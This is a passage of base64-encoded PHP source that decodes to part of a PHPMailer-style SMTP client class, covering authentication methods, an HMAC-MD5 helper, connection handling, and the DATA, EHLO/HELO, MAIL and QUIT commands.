jdXJlIHRoYW4gdGhlIG90aGVycwogICAgICAgIGZvcmVhY2ggKFsnQ1JBTS1NRDUnLCAnTE9HSU4nLCAnUExBSU4nLCAnWE9BVVRIMiddIGFzICRtZXRob2QpIHsKICAgICAgICAgIGlmIChpbl9hcnJheSgkbWV0aG9kLCAkdGhpcy0+c2VydmVyX2NhcHNbJ0FVVEgnXSkpIHsKICAgICAgICAgICAgJGF1dGh0eXBlID0gJG1ldGhvZDsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChlbXB0eSgkYXV0aHR5cGUpKSB7CiAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ05vIHN1cHBvcnRlZCBhdXRoZW50aWNhdGlvbiBtZXRob2RzIGZvdW5kJyk7CiAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIHNlbGY6OmVkZWJ1ZygnQXV0aCBtZXRob2Qgc2VsZWN0ZWQ6ICcgLiAkYXV0aHR5cGUsIHNlbGY6OkRFQlVHX0xPV0xFVkVMKTsKICAgICAgfQogICAgICBpZiAoIWluX2FycmF5KCRhdXRodHlwZSwgJHRoaXMtPnNlcnZlcl9jYXBzWydBVVRIJ10pKSB7CiAgICAgICAgJHRoaXMtPnNldEVycm9yKCJUaGUgcmVxdWVzdGVkIGF1dGhlbnRpY2F0aW9uIG1ldGhvZCBcIiRhdXRodHlwZVwiIGlzIG5vdCBzdXBwb3J0ZWQgYnkgdGhlIHNlcnZlciIpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQogICAgfSBlbHNlaWYgKGVtcHR5KCRhdXRodHlwZSkpIHsKICAgICAgJGF1dGh0eXBlID0gJ0xPR0lOJzsKICAgIH0KICAgIHN3aXRjaCAoJGF1dGh0eXBlKSB7CiAgICAgIGNhc2UgJ1BMQUlOJzoKICAgICAgICAvLyBTdGFydCBhdXRoZW50aWNhdGlvbgogICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCdBVVRIJywgJ0FVVEggUExBSU4nLCAzMzQpKSB7CiAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIC8vIFNlbmQgZW5jb2RlZCB1c2VybmFtZSBhbmQgcGFzc3dvcmQKICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgKICAgICAgICAgICdVc2VyICYgUGFzc3dvcmQnLAogICAgICAgICAgYmFzZTY0X2VuY29kZSgiXDAiIC4gJHVzZXJuYW1lIC4gIlwwIiAuICRwYXNzd29yZCksCiAgICAgICAgICAyMzUKICAgICAgICApCiAgICAgICAgKSB7CiAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgICBjYXNlICdMT0dJTic6CiAgICAgICAgLy8gU3RhcnQgYXV0aGVudGljYXRpb24KICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnQVVUSCcsICdBVVRIIExPR0lOJywgMzM0KSkgewogICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnVXNlcm5hbWUnLCBiYXNlNjRfZW5jb2RlKCR1c2VybmFtZSksIDMzNCkpIHsKICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ1Bhc3N3b3JkJywgYmFzZTY0X2VuY29kZSgkcGFzc3dvcmQpLCAyMzUpKSB7CiAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgICBjYXNlICdDUkFNLU1ENSc6CiAgICAgICAgLy8gU3RhcnQgYXV0aGVudGljYXRpb24KICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnQVVUSCBDUkFNLU1ENScsICdBVVRIIENSQU0tTUQ1JywgMzM0KSkgewogICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAvLyBHZXQgdGhlIGNoYWxsZW5nZQogICAgICAgICRjaGFsbGVuZ2UgPSBiYXNlNjRfZGVjb2RlKHN1YnN0cigkdGhpcy0+bGFzdF9yZXBseSwgNCkpOwogICAgICAgIC8vIEJ1aWxkIHRoZSByZXNwb25zZQogICAgICAgICRyZXNwb25zZSA9ICR1c2VybmFtZSAuICcgJyAuICR0aGlzLT5obWFjKCRjaGFsbGVuZ2UsICRwYXNzd29yZCk7CiAgICAgICAgLy8gc2VuZCBlbmNvZGVkIGNyZWRlbnRpYWxzCiAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kQ29tbWFuZCgnVXNlcm5hbWUnLCBiYXNlNjRfZW5jb2RlKCRyZXNwb25zZSksIDIzNSk7CiAgICAgIGNhc2UgJ1hPQVVUSDInOgogICAgICAgIC8vVGhlIE9BdXRoIGluc3RhbmNlIG11c3QgYmUgc2V0IHVwIHByaW9yIHRvIHJlcXVlc3RpbmcgYXV0aC4KICAgICAgICBpZiAobnVsbCA9PT0gJE9BdXRoKSB7CiAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgICRvYXV0aCA9ICRPQXV0aC0+Z2V0T2F1dGg2NCgpOwogICAgICAgIC8vIFN0YXJ0IGF1dGhlbnRpY2F0aW9uCiAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ0FVVEgnLCAnQVVUSCBYT0FVVEgyICcgLiAkb2F1dGgsIDIzNSkpIHsKICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgYnJlYWs7CiAgICAgIGRlZmF1bHQ6CiAgICAgICAgJHRoaXMtPnNldEVycm9yKCJBdXRoZW50aWNhdGlvbiBtZXRob2QgXCIkYXV0aHR5cGVcIiBpcyBub3Qgc3VwcG9ydGVkIik7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgcmV0dXJuIHRydWU7CiAgfQogIC8qKgogICAqIENhbGN1bGF0ZSBhbiBNRDUgSE1BQyBoYXNoLgogICAqIFdvcmtzIGxpa2UgaGFzaF9obWFjKCdtZDUnLCAkZGF0YSwgJGtleSkKICAgKiBpbiBjYXNlIHRoYXQgZnVuY3Rpb24gaXMgbm90IGF2YWlsYWJsZS4KICAgKgogICAqIEBwYXJhbSBzdHJpbmcgJGRhdGEgVGhlIGRhdGEgdG8gaGFzaAogICAqIEBwYXJhbSBzdHJpbmcgJGtleSAgVGhlIGtleSB0byBoYXNoIHdpdGgKICAgKgogICAqIEByZXR1cm4gc3RyaW5nCiAgICovCiAgcHJvdGVjdGVkIGZ1bmN0aW9uIGhtYWMoJGRhdGEsICRrZXkpCiAgewogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnaGFzaF9obWFjJykpIHsKICAgICAgcmV0dXJuIGhhc2hfaG1hYygnbWQ1JywgJGRhdGEsICRrZXkpOwogICAgfQogICAgLy8gVGhlIGZvbGxvd2luZyBib3Jyb3dlZCBmcm9tCiAgICAvLyBodHRwOi8vcGhwLm5ldC9tYW51YWwvZW4vZnVuY3Rpb24ubWhhc2gucGhwIzI3MjI1CiAgICAvLyBSRkMgMjEwNCBITUFDIGltcGxlbWVudGF0aW9uIGZvciBwaHAuCiAgICAvLyBDcmVhdGVzIGFuIG1kNSBITUFDLgogICAgLy8gRWxpbWluYXRlcyB0aGUgbmVlZCB0byBpbnN0YWxsIG1oYXNoIHRvIGNvbXB1dGUgYSBITUFDCiAgICAvLyBieSBMYW5jZSBSdXNoaW5nCiAgICAkYnl0ZWxlbiA9IDY0OyAvLyBieXRlIGxlbmd0aCBmb3IgbWQ1CiAgICBpZiAoc3RybGVuKCRrZXkpID4gJGJ5dGVsZW4pIHsKICAgICAgJGtleSA9IHBhY2soJ0gqJywgbWQ1KCRrZXkpKTsKICAgIH0KICAgICRrZXkgPSBzdHJfcGFkKCRrZXksICRieXRlbGVuLCBjaHIoMHgwMCkpOwogICAgJGlwYWQgPSBzdHJfcGFkKCcnLCAkYnl0ZWxlbiwgY2hyKDB4MzYpKTsKICAgICRvcGFkID0gc3RyX3BhZCgnJywgJGJ5dGVsZW4sIGNocigweDVjKSk7CiAgICAka19pcGFkID0gJGtleSBeICRpcGFkOwogICAgJGtfb3BhZCA9ICRrZXkgXiAkb3BhZDsKICAgIHJldHVybiBtZDUoJGtfb3BhZCAuIHBhY2soJ0gqJywgbWQ1KCRrX2lwYWQgLiAkZGF0YSkpKTsKICB9CiAgLyoqCiAgICogQ2hlY2sgY29ubmVjdGlvbiBzdGF0ZS4KICAgKgogICAqIEByZXR1cm4gYm9vbCBUcnVlIGlmIGNvbm5lY3RlZAogICAqLwogIHB1YmxpYyBmdW5jdGlvbiBjb25uZWN0ZWQoKQogIHsKICAgIGlmIChpc19yZXNvdXJjZSgkdGhpcy0+c210cF9jb25uKSkgewogICAgICAkc29ja19zdGF0dXMgPSBzdHJlYW1fZ2V0X21ldGFfZGF0YSgkdGhpcy0+c210cF9jb25uKTsKICAgICAgaWYgKCRzb2NrX3N0YXR1c1snZW9mJ10pIHsKICAgICAgICAvLyBUaGUgc29ja2V0IGlzIHZhbGlkIGJ1dCB3ZSBhcmUgbm90IGNvbm5lY3RlZAogICAgICAgICR0aGlzLT5lZGVidWcoCiAgICAgICAgICAnU01UUCBOT1RJQ0U6IEVPRiBjYXVnaHQgd2hpbGUgY2hlY2tpbmcgaWYgY29ubmVjdGVkJywKICAgICAgICAgIHNlbGY6OkRFQlVHX0NMSUVOVAogICAgICAgICk7CiAgICAgICAgJHRoaXMtPmNsb3NlKCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CiAgICAgIHJldHVybiB0cnVlOyAvLyBldmVyeXRoaW5nIGxvb2tzIGdvb2QKICAgIH0KICAgIHJldHVybiBmYWxzZTsKICB9CiAgLyoqCiAgICogQ2xvc2UgdGhlIHNvY2tldCBhbmQgY2xlYW4gdXAgdGhlIHN0YXRlIG9mIHRoZSBjbGFzcy4KICAgKiBEb24ndCB1c2UgdGhpcyBmdW5jdGlvbiB3aXRob3V0IGZpcnN0IHRyeWluZyB0byB1c2UgUVVJVC4KICAgKgogICAqIEBzZWUgcXVpdCgpCiAgICovCiAgcHVibGljIGZ1bmN0aW9uIGNsb3NlKCkKICB7CiAgICAkdGhpcy0+c2V0RXJyb3IoJycpOwogICAgJHRoaXMtPnNlcnZlcl9jYXBzID0gbnVsbDsKICAgICR0aGlzLT5oZWxvX3JwbHkgPSBudWxsOwogICAgaWYgKGlzX3Jlc291cmNlKCR0aGlzLT5zbXRwX2Nvbm4pKSB7CiAgICAgIC8vIGNsb3NlIHRoZSBjb25uZWN0aW9uIGFuZCBjbGVhbnVwCiAgICAgIGZjbG9zZSgkdGhpcy0+c210cF9jb25uKTsKICAgICAgJHRoaXMtPnNtdHBfY29ubiA9IG51bGw7IC8vTWFrZXMgZm9yIGNsZWFuZXIgc2VyaWFsaXphdGlvbgogICAgICAkdGhpcy0+ZWRlYnVnKCdDb25uZWN0aW9uOiBjbG9zZWQnLCBzZWxmOjpERUJVR19DT05ORUNUSU9OKTsKICAgIH0KICB9CiAgLyoqCiAgICogU2VuZCBhbiBTTVRQIERBVEEgY29tbWFuZC4KICAgKiBJc3N1ZXMgYSBkYXRhIGNvbW1hbmQgYW5kIHNlbmRzIHRoZSBtc2dfZGF0YSB0byB0aGUgc2VydmVyLAogICAqIGZpbmlhbGl6aW5nIHRoZSBtYWlsIHRyYW5zYWN0aW9uLiAkbXNnX2RhdGEgaXMgdGhlIG1lc3NhZ2UKICAgKiB0aGF0IGlzIHRvIGJlIHNlbmQgd2l0aCB0aGUgaGVhZGVycy4gRWFjaCBoZWFkZXIgbmVlZHMgdG8gYmUKICAgKiBvbiBhIHNpbmdsZSBsaW5lIGZvbGxvd2VkIGJ5IGEgPENSTEY+IHdpdGggdGhlIG1lc3NhZ2UgaGVhZGVycwogICAqIGFuZCB0aGUgbWVzc2FnZSBib2R5IGJlaW5nIHNlcGFyYXRlZCBieSBhbiBhZGRpdGlvbmFsIDxDUkxGPi4KICAgKiBJbXBsZW1lbnRzIFJGQyA4MjE6IERBVEEgPENSTEY+LgogICAqCiAgICogQHBhcmFtIHN0cmluZyAkbXNnX2RhdGEgTWVzc2FnZSBkYXRhIHRvIHNlbmQKICAgKgogICAqIEByZXR1cm4gYm9vbAogICAqLwogIHB1YmxpYyBmdW5jdGlvbiBkYXRhKCRtc2dfZGF0YSkKICB7CiAgICAvL1RoaXMgd2lsbCB1c2UgdGhlIHN0YW5kYXJkIHRpbWVsaW1pdAogICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ0RBVEEnLCAnREFUQScsIDM1NCkpIHsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgLyogVGhlIHNlcnZlciBpcyByZWFkeSB0byBhY2NlcHQgZGF0YSEKICAgICAqIEFjY29yZGluZyB0byByZmM4MjEgd2Ugc2hvdWxkIG5vdCBzZW5kIG1vcmUgdGhhbiAxMDAwIGNoYXJhY3RlcnMgb24gYSBzaW5nbGUgbGluZSAoaW5jbHVkaW5nIHRoZSBMRSkKICAgICAqIHNvIHdlIHdpbGwgYnJlYWsgdGhlIGRhdGEgdXAgaW50byBsaW5lcyBieSBcciBhbmQvb3IgXG4gdGhlbiBpZiBuZWVkZWQgd2Ugd2lsbCBicmVhayBlYWNoIG9mIHRob3NlIGludG8KICAgICAqIHNtYWxsZXIgbGluZXMgdG8gZml0IHdpdGhpbiB0aGUgbGltaXQuCiAgICAgKiBXZSB3aWxsIGFsc28gbG9vayBmb3IgbGluZXMgdGhhdCBzdGFydCB3aXRoIGEgJy4nIGFuZCBwcmVwZW5kIGFuIGFkZGl0aW9uYWwgJy4nLgogICAgICogTk9URTogdGhpcyBkb2VzIG5vdCBjb3VudCB0b3dhcmRzIGxpbmUtbGVuZ3RoIGxpbWl0LgogICAgICovCiAgICAvLyBOb3JtYWxpemUgbGluZSBicmVha3MgYmVmb3JlIGV4cGxvZGluZwogICAgJGxpbmVzID0gZXhwbG9kZSgiXG4iLCBzdHJfcmVwbGFjZShbIlxyXG4iLCAiXHIiXSwgIlxuIiwgJG1zZ19kYXRhKSk7CiAgICAvKiBUbyBkaXN0aW5ndWlzaCBiZXR3ZWVuIGEgY29tcGxldGUgUkZDODIyIG1lc3NhZ2UgYW5kIGEgcGxhaW4gbWVzc2FnZSBib2R5LCB3ZSBjaGVjayBpZiB0aGUgZmlyc3QgZmllbGQKICAgICAqIG9mIHRoZSBmaXJzdCBsaW5lICgnOicgc2VwYXJhdGVkKSBkb2VzIG5vdCBjb250YWluIGEgc3BhY2UgdGhlbiBpdCBfc2hvdWxkXyBiZSBhIGhlYWRlciBhbmQgd2Ugd2lsbAogICAgICogcHJvY2VzcyBhbGwgbGluZXMgYmVmb3JlIGEgYmxhbmsgbGluZSBhcyBoZWFkZXJzLgogICAgICovCiAgICAkZmllbGQgPSBzdWJzdHIoJGxpbmVzWzBdLCAwLCBzdHJwb3MoJGxpbmVzWzBdLCAnOicpKTsKICAgICRpbl9oZWFkZXJzID0gZmFsc2U7CiAgICBpZiAoIWVtcHR5KCRmaWVsZCkgYW5kIHN0cnBvcygkZmllbGQsICcgJykgPT09IGZhbHNlKSB7CiAgICAgICRpbl9oZWFkZXJzID0gdHJ1ZTsKICAgIH0KICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAkbGluZSkgewogICAgICAkbGluZXNfb3V0ID0gW107CiAgICAgIGlmICgkaW5faGVhZGVycyBhbmQgJGxpbmUgPT0gJycpIHsKICAgICAgICAkaW5faGVhZGVycyA9IGZhbHNlOwogICAgICB9CiAgICAgIC8vQnJlYWsgdGhpcyBsaW5lIHVwIGludG8gc2V2ZXJhbCBzbWFsbGVyIGxpbmVzIGlmIGl0J3MgdG9vIGxvbmcKICAgICAgLy9NaWNyby1vcHRpbWlzYXRpb246IGlzc2V0KCRzdHJbJGxlbl0pIGlzIGZhc3RlciB0aGFuIChzdHJsZW4oJHN0cikgPiAkbGVuKSwKICAgICAgd2hpbGUgKGlzc2V0KCRsaW5lW3NlbGY6Ok1BWF9MSU5FX0xFTkdUSF0pKSB7CiAgICAgICAgLy9Xb3JraW5nIGJhY2t3YXJkcywgdHJ5IHRvIGZpbmQgYSBzcGFjZSB3aXRoaW4gdGhlIGxhc3QgTUFYX0xJTkVfTEVOR1RIIGNoYXJzIG9mIHRoZSBsaW5lIHRvIGJyZWFrIG9uCiAgICAgICAgLy9zbyBhcyB0byBhdm9pZCBicmVha2luZyBpbiB0aGUgbWlkZGxlIG9mIGEgd29yZAogICAgICAgICRwb3MgPSBzdHJycG9zKHN1YnN0cigkbGluZSwgMCwgc2VsZjo6TUFYX0xJTkVfTEVOR1RIKSwgJyAnKTsKICAgICAgICAvL0RlbGliZXJhdGVseSBtYXRjaGVzIGJvdGggZmFsc2UgYW5kIDAKICAgICAgICBpZiAoISRwb3MpIHsKICAgICAgICAgIC8vTm8gbmljZSBicmVhayBmb3VuZCwgYWRkIGEgaGFyZCBicmVhawogICAgICAgICAgJHBvcyA9IHNlbGY6Ok1BWF9MSU5FX0xFTkdUSCAtIDE7CiAgICAgICAgICAkbGluZXNfb3V0W10gPSBzdWJzdHIoJGxpbmUsIDAsICRwb3MpOwogICAgICAgICAgJGxpbmUgPSBzdWJzdHIoJGxpbmUsICRwb3MpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAvL0JyZWFrIGF0IHRoZSBmb3VuZCBwb2ludAogICAgICAgICAgJGxpbmVzX291dFtdID0gc3Vic3RyKCRsaW5lLCAwLCAkcG9zKTsKICAgICAgICAgIC8vTW92ZSBhbG9uZyBieSB0aGUgYW1vdW50IHdlIGRlYWx0IHdpdGgKICAgICAgICAgICRsaW5lID0gc3Vic3RyKCRsaW5lLCAkcG9zICsgMSk7CiAgICAgICAgfQogICAgICAgIC8vSWYgcHJvY2Vzc2luZyBoZWFkZXJzIGFkZCBhIExXU1AtY2hhciB0byB0aGUgZnJvbnQgb2YgbmV3IGxpbmUgUkZDODIyIHNlY3Rpb24gMy4xLjEKICAgICAgICBpZiAoJGluX2hlYWRlcnMpIHsKICAgICAgICAgICRsaW5lID0gIlx0IiAuICRsaW5lOwogICAgICAgIH0KICAgICAgfQogICAgICAkbGluZXNfb3V0W10gPSAkbGluZTsKICAgICAgLy9TZW5kIHRoZSBsaW5lcyB0byB0aGUgc2VydmVyCiAgICAgIGZvcmVhY2ggKCRsaW5lc19vdXQgYXMgJGxpbmVfb3V0KSB7CiAgICAgICAgLy9SRkMyODIxIHNlY3Rpb24gNC41LjIKICAgICAgICBpZiAoIWVtcHR5KCRsaW5lX291dCkgYW5kICRsaW5lX291dFswXSA9PSAnLicpIHsKICAgICAgICAgICRsaW5lX291dCA9ICcuJyAuICRsaW5lX291dDsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPmNsaWVudF9zZW5kKCRsaW5lX291dCAuIHN0YXRpYzo6TEUsICdEQVRBJyk7CiAgICAgIH0KICAgIH0KICAgIC8vTWVzc2FnZSBkYXRhIGhhcyBiZWVuIHNlbnQsIGNvbXBsZXRlIHRoZSBjb21tYW5kCiAgICAvL0luY3JlYXNlIHRpbWVsaW1pdCBmb3IgZW5kIG9mIERBVEEgY29tbWFuZAogICAgJHNhdmV0aW1lbGltaXQgPSAkdGhpcy0+VGltZWxpbWl0OwogICAgJHRoaXMtPlRpbWVsaW1pdCA9ICR0aGlzLT5UaW1lbGltaXQgKiAyOwogICAgJHJlc3VsdCA9ICR0aGlzLT5zZW5kQ29tbWFuZCgnREFUQSBFTkQnLCAnLicsIDI1MCk7CiAgICAkdGhpcy0+cmVjb3JkTGFzdFRyYW5zYWN0aW9uSUQoKTsKICAgIC8vUmVzdG9yZSB0aW1lbGltaXQKICAgICR0aGlzLT5UaW1lbGltaXQgPSAkc2F2ZXRpbWVsaW1pdDsKICAgIHJldHVybiAkcmVzdWx0OwogIH0KICAvKioKICAgKiBTZW5kIGFuIFNNVFAgSEVMTyBvciBFSExPIGNvbW1hbmQuCiAgICogVXNlZCB0byBpZGVudGlmeSB0aGUgc2VuZGluZyBzZXJ2ZXIgdG8gdGhlIHJlY2VpdmluZyBzZXJ2ZXIuCiAgICogVGhpcyBtYWtlcyBzdXJlIHRoYXQgY2xpZW50IGFuZCBzZXJ2ZXIgYXJlIGluIGEga25vd24gc3RhdGUuCiAgICogSW1wbGVtZW50cyBSRkMgODIxOiBIRUxPIDxTUD4gPGRvbWFpbj4gPENSTEY+CiAgICogYW5kIFJGQyAyODIxIEVITE8uCiAgICoKICAgKiBAcGFyYW0gc3RyaW5nICRob3N0IFRoZSBob3N0IG5hbWUgb3IgSVAgdG8gY29ubmVjdCB0bwogICAqCiAgICogQHJldHVybiBib29sCiAgICovCiAgcHVibGljIGZ1bmN0aW9uIGhlbGxvKCRob3N0ID0gJycpCiAgewogICAgLy9UcnkgZXh0ZW5kZWQgaGVsbG8gZmlyc3QgKFJGQyAyODIxKQogICAgcmV0dXJuICR0aGlzLT5zZW5kSGVsbG8oJ0VITE8nLCAkaG9zdCkgb3IgJHRoaXMtPnNlbmRIZWxsbygnSEVMTycsICRob3N0KTsKICB9CiAgLyoqCiAgICogU2VuZCBhbiBTTVRQIEhFTE8gb3IgRUhMTyBjb21tYW5kLgogICAqIExvdy1sZXZlbCBpbXBsZW1lbnRhdGlvbiB1c2VkIGJ5IGhlbGxvKCkuCiAgICoKICAgKiBAcGFyYW0gc3RyaW5nICRoZWxsbyBUaGUgSEVMTyBzdHJpbmcKICAgKiBAcGFyYW0gc3RyaW5nICRob3N0ICBUaGUgaG9zdG5hbWUgdG8gc2F5IHdlIGFyZQogICAqCiAgICogQHJldHVybiBib29sCiAgICoKICAgKiBAc2VlICAgIGhlbGxvKCkKICAgKi8KICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2VuZEhlbGxvKCRoZWxsbywgJGhvc3QpCiAgewogICAgJG5vZXJyb3IgPSAkdGhpcy0+c2VuZENvbW1hbmQoJGhlbGxvLCAkaGVsbG8gLiAnICcgLiAkaG9zdCwgMjUwKTsKICAgICR0aGlzLT5oZWxvX3JwbHkgPSAkdGhpcy0+bGFzdF9yZXBseTsKICAgIGlmICgkbm9lcnJvcikgewogICAgICAkdGhpcy0+cGFyc2VIZWxsb0ZpZWxkcygkaGVsbG8pOwogICAgfSBlbHNlIHsKICAgICAgJHRoaXMtPnNlcnZlcl9jYXBzID0gbnVsbDsKICAgIH0KICAgIHJldHVybiAkbm9lcnJvcjsKICB9CiAgLyoqCiAgICogUGFyc2UgYSByZXBseSB0byBIRUxPL0VITE8gY29tbWFuZCB0byBkaXNjb3ZlciBzZXJ2ZXIgZXh0ZW5zaW9ucy4KICAgKiBJbiBjYXNlIG9mIEhFTE8sIHRoZSBvbmx5IHBhcmFtZXRlciB0aGF0IGNhbiBiZSBkaXNjb3ZlcmVkIGlzIGEgc2VydmVyIG5hbWUuCiAgICoKICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlIGBIRUxPYCBvciBgRUhMT2AKICAgKi8KICBwcm90ZWN0ZWQgZnVuY3Rpb24gcGFyc2VIZWxsb0ZpZWxkcygkdHlwZSkKICB7CiAgICAkdGhpcy0+c2VydmVyX2NhcHMgPSBbXTsKICAgICRsaW5lcyA9IGV4cGxvZGUoIlxuIiwgJHRoaXMtPmhlbG9fcnBseSk7CiAgICBmb3JlYWNoICgkbGluZXMgYXMgJG4gPT4gJHMpIHsKICAgICAgLy9GaXJzdCA0IGNoYXJzIGNvbnRhaW4gcmVzcG9uc2UgY29kZSBmb2xsb3dlZCBieSAtIG9yIHNwYWNlCiAgICAgICRzID0gdHJpbShzdWJzdHIoJHMsIDQpKTsKICAgICAgaWYgKGVtcHR5KCRzKSkgewogICAgICAgIGNvbnRpbnVlOwogICAgICB9CiAgICAgICRmaWVsZHMgPSBleHBsb2RlKCcgJywgJHMpOwogICAgICBpZiAoIWVtcHR5KCRmaWVsZHMpKSB7CiAgICAgICAgaWYgKCEkbikgewogICAgICAgICAgJG5hbWUgPSAkdHlwZTsKICAgICAgICAgICRmaWVsZHMgPSAkZmllbGRzWzBdOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAkbmFtZSA9IGFycmF5X3NoaWZ0KCRmaWVsZHMpOwogICAgICAgICAgc3dpdGNoICgkbmFtZSkgewogICAgICAgICAgICBjYXNlICdTSVpFJzoKICAgICAgICAgICAgICAkZmllbGRzID0gKCRmaWVsZHMgPyAkZmllbGRzWzBdIDogMCk7CiAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ0FVVEgnOgogICAgICAgICAgICAgIGlmICghaXNfYXJyYXkoJGZpZWxkcykpIHsKICAgICAgICAgICAgICAgICRmaWVsZHMgPSBbXTsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgJGZpZWxkcyA9IHRydWU7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICR0aGlzLT5zZXJ2ZXJfY2Fwc1skbmFtZV0gPSAkZmllbGRzOwogICAgICB9CiAgICB9CiAgfQogIC8qKgogICAqIFNlbmQgYW4gU01UUCBNQUlMIGNvbW1hbmQuCiAgICogU3RhcnRzIGEgbWFpbCB0cmFuc2FjdGlvbiBmcm9tIHRoZSBlbWFpbCBhZGRyZXNzIHNwZWNpZmllZCBpbgogICAqICRmcm9tLiBSZXR1cm5zIHRydWUgaWYgc3VjY2Vzc2Z1bCBvciBmYWxzZSBvdGhlcndpc2UuIElmIFRydWUKICAgKiB0aGUgbWFpbCB0cmFuc2FjdGlvbiBpcyBzdGFydGVkIGFuZCB0aGVuIG9uZSBvciBtb3JlIHJlY2lwaWVudAogICAqIGNvbW1hbmRzIG1heSBiZSBjYWxsZWQgZm9sbG93ZWQgYnkgYSBkYXRhIGNvbW1hbmQuCiAgICogSW1wbGVtZW50cyBSRkMgODIxOiBNQUlMIDxTUD4gRlJPTTo8cmV2ZXJzZS1wYXRoPiA8Q1JMRj4uCiAgICoKICAgKiBAcGFyYW0gc3RyaW5nICRmcm9tIFNvdXJjZSBhZGRyZXNzIG9mIHRoaXMgbWVzc2FnZQogICAqCiAgICogQHJldHVybiBib29sCiAgICovCiAgcHVibGljIGZ1bmN0aW9uIG1haWwoJGZyb20pCiAgewogICAgJHVzZVZlcnAgPSAoJHRoaXMtPmRvX3ZlcnAgPyAnIFhWRVJQJyA6ICcnKTsKICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoCiAgICAgICdNQUlMIEZST00nLAogICAgICAnTUFJTCBGUk9NOjwnIC4gJGZyb20gLiAnPicgLiAkdXNlVmVycCwKICAgICAgMjUwCiAgICApOwogIH0KICAvKioKICAgKiBTZW5kIGFuIFNNVFAgUVVJVCBjb21tYW5kLgogICAqIENsb3NlcyB0aGUgc29ja2V0IGlmIHRoZXJlIGlzIG5vIGVycm9yIG9yIHRoZSAkY2xvc2Vfb25fZXJyb3IgYXJndW1lbnQgaXMgdHJ1ZS4KICAgKiBJbXBsZW1lbnRzIGZyb20gUkZDIDgyMTogUVVJVCA8Q1JMRj4uCiAgICoKICAgKiBAcGFyYW0gYm9vbCAkY2xvc2Vfb25fZXJyb3IgU2hvdWxkIHRoZSBjb25uZWN0aW9uIGNsb3NlIGlmIGFuIGVycm9yIG9jY3Vycz8KICAgKgogICAqIEByZXR1cm4gYm9vbAogICAqLwogIHB1YmxpYyBmdW5jdGlvbiBxdWl0KCRjbG9zZV9vbl9lcnJvciA9IHRydWUpCiAgewogICAgJG5vZXJyb3IgPSAkdGhpcy0+c2VuZENvbW1hbmQoJ1FVSVQnLCAnUVVJVCcsIDIyMSk7CiAgICAkZXJyID0gJHRoaXMtPmVycm9yOyAvL1NhdmUgYW55IGVycm9yCiAgICBpZiAoJG5vZXJyb3Igb3IgJGNsb3NlX29uX2Vycm9yKSB7CiAgICAgICR0aGlzLT5jbG9zZSgpOwogICAgICAkdGhpcy0+ZXJyb3IgPSAkZXJyOyAvL1Jlc3RvcmUgYW55IGVycm9yIGZyb20gdGhlIHF1aXQgY29tbWFuZAogICAgfQogICAgcmV0dXJuICRub2Vycm9yOwogIH0KICAvKioKICAgKiBTZW5kIGFuIFNNVFAgUkNQVCBjb21tYW5kLgogICAqIFNldHMgdGhlIFRPIGFyZ3VtZW50IHRvICR0b2FkZHIuCiAgICogUmV0dXJucyB0cnVlIGlmIHRoZSByZWNpcGllbnQgd2FzIGFjY2VwdGVkIGZhbHNlIGlmIGl0IHdhcyByZWplY3RlZC4KICAgKiBJbXBsZW1lbnRzIGZyb20gUkZDIDgyMTogUkNQVCA8U1A+IFRPOjxmb3J3YXJkLXBhdGg+IDxDUkxGPi4KICAgKgogICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGFkZHJlc3MgdGhlIG1lc3NhZ2UgaXMgYmVpbmcgc2VudCB0bwogICAqIEBwYXJhbSBzdHJpbmcgJGRzbiAgICAgQ29tbWEgc2VwYXJhdGVkIGxpc3Qgb2YgRFNOIG5vdGlmaWNhdGlvbnMuIE5FVkVSLCBTVUNDRVNTLCBGQUlMVVJFCiAgICogICAgICAgICAgICAgICAgICAgICAgICBvciBERUxBWS4gSWYgeW91IHNwZWNpZnkgTkVWRVIgYWxsIG90aGVyIG5vdGlmaWNhdGlvbnMgYXJlIGlnbm9yZWQuCiAgICoKICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBwdWJsaWMgZnVuY3Rp